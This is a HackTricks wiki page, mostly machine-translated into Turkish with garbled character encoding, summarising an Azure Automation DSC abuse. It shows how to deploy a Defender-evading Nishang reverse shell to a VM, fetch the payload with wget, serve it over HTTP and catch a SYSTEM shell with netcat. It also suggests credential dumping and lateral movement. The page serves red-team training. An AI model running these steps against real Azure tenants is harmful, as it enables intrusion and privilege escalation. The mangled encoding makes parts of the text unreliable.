# Az - State Configuration RCE

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Check the complete post in:** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)

### Summary of Remote Server (C2) Infrastructure Preparation and Steps

#### Overview

SÃ¼reÃ§, Windows Defender'Ä± atlatmak iÃ§in tasarlanmÄ±ÅŸ, `RevPS.ps1` adÄ±nda deÄŸiÅŸtirilmiÅŸ bir Nishang `Invoke-PowerShellTcp.ps1` yÃ¼kÃ¼nÃ¼ barÄ±ndÄ±rmak Ã¼zere bir uzak sunucu altyapÄ±sÄ±nÄ±n kurulmasÄ±nÄ± iÃ§erir. YÃ¼k, IP'si `40.84.7.74` olan bir Kali Linux makinesinden basit bir Python HTTP sunucusu kullanÄ±larak sunulmaktadÄ±r. Ä°ÅŸlem birkaÃ§ adÄ±mda gerÃ§ekleÅŸtirilir:

#### Step 1 â€” Create Files

* **Gerekli Dosyalar:** Ä°ki PowerShell betiÄŸi gereklidir:
1. `reverse_shell_config.ps1`: YÃ¼kÃ¼ alÄ±p Ã§alÄ±ÅŸtÄ±ran bir Ä°stenilen Durum YapÄ±landÄ±rmasÄ± (DSC) dosyasÄ±dÄ±r. [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) adresinden temin edilebilir.
2. `push_reverse_shell_config.ps1`: YapÄ±landÄ±rmayÄ± VM'ye yayÄ±nlamak iÃ§in bir betik, [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) adresinde mevcuttur.
* **Ã–zelleÅŸtirme:** Bu dosyalardaki deÄŸiÅŸkenler ve parametreler, kullanÄ±cÄ±ya Ã¶zgÃ¼ ortam iÃ§in, kaynak adlarÄ±, dosya yollarÄ± ve sunucu/yÃ¼k tanÄ±mlayÄ±cÄ±larÄ± dahil olmak Ã¼zere Ã¶zelleÅŸtirilmelidir.

#### Step 2 â€” Zip Configuration File

* `reverse_shell_config.ps1` bir `.zip` dosyasÄ±na sÄ±kÄ±ÅŸtÄ±rÄ±lÄ±r, bÃ¶ylece Azure Storage Account'a transfer iÃ§in hazÄ±r hale gelir.
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### AdÄ±m 3 â€” Depolama BaÄŸlamÄ±nÄ± Ayarla ve YÃ¼kle

* SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ yapÄ±landÄ±rma dosyasÄ±, Azure'un Set-AzStorageBlobContent cmdlet'ini kullanarak Ã¶nceden tanÄ±mlanmÄ±ÅŸ Azure Depolama konteyneri olan azure-pentest'e yÃ¼klenir.
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### AdÄ±m 4 â€” Kali Kutusunu HazÄ±rlama

* Kali sunucusu RevPS.ps1 yÃ¼kÃ¼nÃ¼ bir GitHub deposundan indirir.
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
* Script, hedef Windows VM ve ters shell iÃ§in port belirtmek Ã¼zere dÃ¼zenlenir.

#### Step 5 â€” YapÄ±landÄ±rma DosyasÄ±nÄ± YayÄ±nla

* YapÄ±landÄ±rma dosyasÄ± Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r ve ters shell scripti belirtilen konuma Windows VM Ã¼zerinde daÄŸÄ±tÄ±lÄ±r.

#### Step 6 â€” Payload'Ä± BarÄ±ndÄ±r ve Dinleyici Kur

* Payload'Ä± barÄ±ndÄ±rmak iÃ§in bir Python SimpleHTTPServer baÅŸlatÄ±lÄ±r ve gelen baÄŸlantÄ±larÄ± yakalamak iÃ§in bir Netcat dinleyicisi kurulur.
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
* Planlanan gÃ¶rev, yÃ¼kÃ¼ Ã§alÄ±ÅŸtÄ±rarak SYSTEM dÃ¼zeyinde ayrÄ±calÄ±klar elde eder.

#### SonuÃ§

Bu sÃ¼recin baÅŸarÄ±lÄ± bir ÅŸekilde yÃ¼rÃ¼tÃ¼lmesi, kimlik bilgisi dÃ¶kme veya saldÄ±rÄ±yÄ± birden fazla VM'ye geniÅŸletme gibi daha fazla eylem iÃ§in sayÄ±sÄ±z olasÄ±lÄ±k aÃ§ar. KÄ±lavuz, Azure Automation DSC alanÄ±nda sÃ¼rekli Ã¶ÄŸrenmeyi ve yaratÄ±cÄ±lÄ±ÄŸÄ± teÅŸvik eder.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
